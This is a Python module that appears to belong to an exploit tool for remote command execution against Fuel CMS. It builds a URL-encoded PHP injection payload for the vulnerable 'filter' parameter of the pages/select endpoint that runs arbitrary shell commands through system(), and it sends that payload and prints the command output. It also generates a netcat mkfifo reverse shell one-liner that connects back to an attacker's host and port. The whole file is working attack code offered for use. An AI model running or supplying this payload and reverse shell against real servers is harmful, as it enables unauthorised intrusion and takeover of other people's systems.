from colors import col
import urllib.parse
import requests
from modules.utils import parse_response


class Exploit:
    """Handles payload construction and execution for exploiting the Fuel CMS vulnerability.

    Attributes:
        base_url (str): The base URL used to send the exploit payload.
    """

    def __init__(self, target_ip: str) -> None:
        """Initializes the exploit with the target IP.

        Args:
            target_ip (str): The IP address of the vulnerable server.
        """
        self.base_url = f"http://{target_ip}/fuel/pages/select/?filter="

    def run_command(self, cmd: str) -> None:
        """Sends the exploit payload to execute a command on the target.

        Encodes the command into the vulnerable filter parameter and
        displays the result.

        Args:
            cmd (str): The shell command to execute on the remote server.
        """
        if "/tmp/f;mkfifo" not in cmd:
            print(col.LIGHT_GRAY + "Sending request..." + col.RESET)

        # URL encode the command to prevent formatting issues
        encoded_cmd = urllib.parse.quote(cmd)

        # Craft the payload using a vulnerable PHP filter expression
        payload = (
            "%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27"
            + encoded_cmd
            + "%27)%2B%27"
        )

        try:
            # Send the request to the target with the payload
            r = requests.get(self.base_url + payload)

            # If the request succeeds, parse and display the result
            if r.status_code == 200:
                output = parse_response(r.text)
                if output:
                    print(col.LIGHT_GREEN + output.strip() + col.RESET)
                else:
                    print(col.RED + "No result" + col.RESET)
            else:
                print(col.RED + f"Error: Status code {r.status_code}" + col.RESET)
        except requests.exceptions.RequestException as e:
            print(col.RED + f"Request failed: {e}" + col.RESET)

    def generate_reverse_shell(self, lhost: str, lport: str) -> str:
        """Generates a reverse shell command string using netcat.

        Args:
            lhost (str): Attacker's local host IP address.
            lport (str): Attacker's local port number to connect back to.

        Returns:
            str: A shell command string to establish a reverse shell.
        """
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
